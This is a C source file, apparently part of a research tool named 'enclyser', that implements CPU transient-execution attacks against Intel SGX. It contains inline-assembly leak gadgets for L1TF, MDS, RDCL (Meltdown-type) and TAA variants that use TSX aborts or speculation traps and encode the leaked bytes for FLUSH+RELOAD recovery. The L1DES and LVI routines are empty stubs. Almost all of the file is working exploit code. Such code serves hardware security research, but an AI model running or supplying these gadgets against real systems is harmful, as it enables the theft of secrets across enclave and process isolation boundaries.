#include "enclyser/libenclyser/attack.h"

/**
 * @brief the defines and functions that are exclusive to trusted libraries
 *
 */
#ifdef NAMESPACE_SGX_YES

#include "enclyser/libenclyser/attack_t.h"

/**
 * @brief [ECALL] Try different types of attacks.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/libenclyser/flush_reload.h
 */
void ecall_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    attack(attack_spec, attaking_buffer, encoding_buffer);
}

#endif

/**
 * @brief the defines and functions that are exclusive to untrusted libraries
 *
 */
#ifdef NAMESPACE_SGX_NO

#include "enclyser/libenclyser/attack_u.h"

#endif

/**
 * @brief the defines and functions that are shared by trusted libraries and untrusted libraries
 *
 */
#ifdef NAMESPACE_SGX_SHARED

/**
 * @brief Try different variants of the l1des attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void l1des_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    /** TODO */
}

/**
 * @brief Try different variants of the l1tf attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void l1tf_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;

    ASSERT(0 <= attack_spec->offset && attack_spec->offset < attaking_buffer->size);

    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
    r9 = 0;                                  /** consistent during the process */

    switch (attack_spec->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_NO_TSX:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "call 2f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "3: pause\n"
            "jmp 3b\n"
            "2:\n"
            // "movabs $1f, %%rax\n" /** depreciated and replaced by the next line due to TEXTRELs warning */
            "lea 0x34(%%rip), %%rax\n" /** rax = $1f for x86-64 machine */
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "mov %%eax, (%%rsp)\n"
            "retq\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    case ATTACK_MINOR_TSX:
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "xbegin 1f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "xend\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    default:
        break;
    }
}

/**
 * @brief Try different variants of the lvi attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void lvi_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    /** TODO */
}

/**
 * @brief Try different variants of the mds attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void mds_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;

    ASSERT(0 <= attack_spec->offset && attack_spec->offset < attaking_buffer->size);

    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
    r9 = 0;                                  /** consistent during the process */

    switch (attack_spec->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_NO_TSX:
        break;
    case ATTACK_MINOR_TSX:
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "clflush (%%r8)\n"
            "xbegin 1f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "xend\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    default:
        break;
    }
}

/**
 * @brief Try different variants of the rdcl attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void rdcl_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;

    ASSERT(0 <= attack_spec->offset && attack_spec->offset < attaking_buffer->size);

    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
    r9 = 0;                                  /** consistent during the process */

    switch (attack_spec->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_NO_TSX:
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "call 2f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "3: pause\n"
            "jmp 3b\n"
            "2:\n"
            // "movabs $1f, %%rax\n" /** depreciated and replaced by the next line due to TEXTRELs warning */
            "lea 0x34(%%rip), %%rax\n" /** rax = $1f for x86-64 machine */
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "imulq $1, %%rax, %%rax\n"
            "mov %%eax, (%%rsp)\n"
            "retq\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    case ATTACK_MINOR_TSX:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "xbegin 1f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "xend\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    default:
        break;
    }
}

/**
 * @brief Try different variants of the taa attack.
 *
 * @param attack_spec the specified attack
 * @param attaking_buffer the buffer used by the attack
 * @param encoding_buffer the buffer used to encode data leaked
 *
 * @see FLUSH+RELOAD in enclyser/channel/flush_reload.h
 */
static void taa_attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    uint64_t rax, rdi, rsi, rdx, rcx, r8, r9;

    ASSERT(0 <= attack_spec->offset && attack_spec->offset < attaking_buffer->size);

    rdi = (uint64_t)attack_spec->offset;     /** consistent during the process */
    rsi = (uint64_t)attaking_buffer->shadow; /** consistent during the process */
    rdx = (uint64_t)encoding_buffer->buffer; /** consistent during the process */
    rcx = (uint64_t)CACHELINE_SIZE;          /** rcx = log2(rcx), consistent during the process */
    r8 = (uint64_t)attaking_buffer->buffer;  /** consistent during the process */
    r9 = 0;                                  /** consistent during the process */

    switch (attack_spec->minor)
    {
    case ATTACK_MINOR_NONE:
        break;
    case ATTACK_MINOR_NO_TSX:
        break;
    case ATTACK_MINOR_TSX:
    case ATTACK_MINOR_STABLE:
        asm volatile(
            "movq %5, %%r8\n"
            "movq %6, %%r9\n"
            "tzcnt %%rcx, %%rcx\n" /** rcx = log2(CACHELINE_SIZE) */
            "mfence\n"
            "clflush (%%r8)\n"
            "sfence\n"
            "clflush (%%rdx)\n"
            "xbegin 1f\n"
            "movzbq (%%rdi, %%rsi), %%rax\n"
            "shl %%cl, %%rax\n"
            "movzbq (%%rax, %%rdx), %%rax\n"
            "xend\n"
            "1:\n"
            : "=a"(rax), "+D"(rdi), "+S"(rsi), "+d"(rdx), "+c"(rcx), "+r"(r8), "+r"(r9)
            :
            : "r8", "r9");
        break;
    default:
        break;
    }
}

void attack(attack_spec_t *attack_spec, buffer_t *attaking_buffer, buffer_t *encoding_buffer)
{
    switch (attack_spec->major)
    {
    case ATTACK_MAJOR_NONE:
        break;
    case ATTACK_MAJOR_L1DES:
        l1des_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_L1TF:
        l1tf_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_LVI:
        lvi_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_MDS:
        mds_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_RDCL:
        rdcl_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    case ATTACK_MAJOR_TAA:
        taa_attack(attack_spec, attaking_buffer, encoding_buffer);
        break;
    default:
        break;
    }
}

#endif